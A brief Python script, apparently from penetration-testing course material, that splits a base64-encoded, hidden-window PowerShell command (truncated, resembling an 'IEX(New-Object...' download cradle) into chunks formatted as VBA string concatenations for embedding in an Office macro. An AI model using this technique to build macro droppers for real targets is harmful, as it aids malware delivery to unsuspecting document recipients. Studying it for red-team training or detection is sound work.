'''
VBA has a 255-character limit for literal strings and therefore, we can't 
just embed the base64-encoded PowerShell commands as a single string. 
This restriction does not apply to strings stored in variables, so we 
can split the commands into multiple lines (stored in strings) and 
concatenate them.
'''

str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')